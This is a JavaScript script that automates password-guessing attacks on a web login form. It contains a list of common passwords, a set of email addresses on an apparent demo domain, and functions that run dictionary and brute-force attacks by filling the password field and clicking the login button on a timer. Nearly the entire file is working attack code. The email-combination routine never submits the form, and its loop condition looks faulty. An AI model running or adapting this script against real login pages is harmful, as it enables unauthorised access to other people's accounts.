let dictionary = [123456, 123456789, 12345, "qwerty", "password", 12345678, 111111, 123123, 1234567890, 1234567, "qwerty123", "000000", "1q2w3e", "aa12345678", "abc123", "password1", 1234, "qwertyuiop", 123321, "password123", "1q2w3e4r5t", "iloveyou", 654321, 666666, 987654321, 123, "123456a", "qwe123", "1q2w3e4r", 7777777, "1qaz2wsx", "123qwe", "zxcvbnm", 121212, "asdasd", "a123456", 555555, "dragon", 112233, 123123123, "monkey", 11111111, "qazwsx", 159753, "asdfghjkl", 222222, "1234qwer", "qwerty1", 123654, "123abc", "asdfgh", 777777, "aaaaaa", "myspace1", 88888888, "fuckyou", "123456789a", 999999, 888888, "football", "princess", 789456123, 147258369, 1111111, "sunshine", "michael", "computer", "qwer1234", "daniel", 789456, 11111, "abcd1234", "q1w2e3r4", "shadow", 159357, "123456q", 1111, "samsung", "killer", "asd123", "superman", "master", "12345a", "azerty", "zxcvbn", "qazwsxedc", 131313, "ashley", "target123", 987654, "baseball", "qwert", "asdasd123", "qwerty", "soccer", "charlie", "qweasdzxc", "tinkle", "jessica", "q1w2e3r4t5", "asdf", "test1", "1g2w3e4r", "gwerty123", "zag12wsx", "gwerty", 147258, 12341234, "qweqwe", "jordan", "pokemon", "q1w2e3r4t5y6", 12345678910, 1111111111, 12344321, "thomas", "love", "12qwaszx", 102030, "welcome", "liverpool", "iloveyou1", "michelle", 101010, 1234561, "hello", "andrew", "a123456789", "a12345", "Status", "fuckyou1", "1qaz2wsx3edc", "hunter", "princess1", "naruto", "justin", "jennifer", "qwerty12", "qweasd", "anthony", "andrea", "joshua", "asdf1234", "12345qwert", "1qazxsw2", "marina", "love123", 111222, "robert", 10203, "nicole", "letmein", "football1", "secret", 1234554321, "freedom", "michael1", 11223344, "qqqqqq", 123654789, "chocolate", "12345q", "internet", "q1w2e3", "google", "starwars", "mynoob", "qwertyui", 55555, "qwertyu", "lol123", "lovely", "monkey1", "nikita", "pakistan", 7758521, 87654321, 147852, "jordan23", 212121, 123789, 147852369, "123456789q", "qwe", "forever", 741852963, "123qweasd", "123456abc", "1q2w3e4r5t6y", "qazxsw", 456789, 232323, 999999999, "qwerty12345", "qwaszx", 1234567891, 456123, 444444, "qq123456", "xxx"];
let emails = [
    'albert.einstein@hacker-email.com',
    'grace.hopper@hacker-email.com',
    'marie.curie@hacker-email.com',
    'konrad.zuse@hacker-email.com',
    'stephanie-kwolek@hacker-email.com',
    'carl-friedrich.auss@hacker-email.com',
    'shirley-ann.jackson@hacker-email.com',
    'gertrude-belle.elion@hacker-email.com',
    'steve.wozniak@hacker-email.com',
    'rudolf.bayer@hacker-email.com',
    'ada.lovelace@hacker-email.com'
];

let index = 0;


function dictionaryAttack() {
    let currentPassword = dictionary[index];
    console.log('Testing password', currentPassword);
    index++;
    password.type = 'text';
    password.value = currentPassword;
    loginButton.click();
    if (index < dictionary.length) {
        setTimeout(dictionaryAttack, 500);
    }
}

function emailDictionaryAttack(i, j) {
    console.log('Testing', emails[i], dictionary[j]);
    password.type = 'text';
    username.value = emails[i];
    password.value = dictionary[j];
    j++;

    if (j >= dictionary.length) {
        i++;
        j = 0;
    }

    if (i < emails.length || j < dictionary.length) {
        setTimeout(emailDictionaryAttack, 500, i, j);
    }
}

let alphabet = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"];


function bruteForceAttack(length) {
    let combinations = [];

    for (let i = 0; i <= length; i++) {
        let newSets = combineArrays(Array.from(Array(i)).map(a => alphabet));
        combinations = [...combinations, ...newSets];
    }
    console.log(combinations);

    tryCombinations(combinations)
}

function tryCombinations(combinations) {
    console.log('Trying Password', combinations[index]);
    password.type = 'text';
    password.value = combinations[index];
    loginButton.click();
    index++;
    if (index < combinations.length) {
        setTimeout(tryCombinations, 500, combinations);
    }
}


function combineArrays(array_of_arrays) {

    // First, handle some degenerate cases...

    if (!array_of_arrays) {
        // Or maybe we should toss an exception...?
        return [];
    }

    if (!Array.isArray(array_of_arrays)) {
        // Or maybe we should toss an exception...?
        return [];
    }

    if (array_of_arrays.length == 0) {
        return [];
    }

    for (let i = 0; i < array_of_arrays.length; i++) {
        if (!Array.isArray(array_of_arrays[i]) || array_of_arrays[i].length == 0) {
            // If any of the arrays in array_of_arrays are not arrays or zero-length, return an empty array...
            return [];
        }
    }

    // Done with degenerate cases...

    // Start "odometer" with a 0 for each array in array_of_arrays.
    let odometer = new Array(array_of_arrays.length);
    odometer.fill(0);

    let output = [];

    let newCombination = formCombination(odometer, array_of_arrays);

    output.push(newCombination);

    while (odometer_increment(odometer, array_of_arrays)) {
        newCombination = formCombination(odometer, array_of_arrays);
        output.push(newCombination);
    }

    return output;
}

// Translate "odometer" to combinations from array_of_arrays
function formCombination(odometer, array_of_arrays) {
    // In Imperative Programmingese (i.e., English):
    // let s_output = "";
    // for( let i=0; i < odometer.length; i++ ){
    //    s_output += "" + array_of_arrays[i][odometer[i]]; 
    // }
    // return s_output;

    // In Functional Programmingese (Henny Youngman one-liner):
    return odometer.reduce(
        function(accumulator, odometer_value, odometer_index) {
            return "" + accumulator + array_of_arrays[odometer_index][odometer_value];
        },
        ""
    );
} /* formCombination() */

function odometer_increment(odometer, array_of_arrays) {

    // Basically, work you way from the rightmost digit of the "odometer"...
    // if you're able to increment without cycling that digit back to zero,
    // you're all done, otherwise, cycle that digit to zero and go one digit to the
    // left, and begin again until you're able to increment a digit
    // without cycling it...simple, huh...?

    for (let i_odometer_digit = odometer.length - 1; i_odometer_digit >= 0; i_odometer_digit--) {

        let maxee = array_of_arrays[i_odometer_digit].length - 1;

        if (odometer[i_odometer_digit] + 1 <= maxee) {
            // increment, and you're done...
            odometer[i_odometer_digit]++;
            return true;
        } else {
            if (i_odometer_digit - 1 < 0) {
                // No more digits left to increment, end of the line...
                return false;
            } else {
                // Can't increment this digit, cycle it to zero and continue
                // the loop to go over to the next digit...
                odometer[i_odometer_digit] = 0;
                continue;
            }
        }
    } /* for( let odometer_digit = odometer.length-1; odometer_digit >=0; odometer_digit-- ) */

} /* odometer_increment() */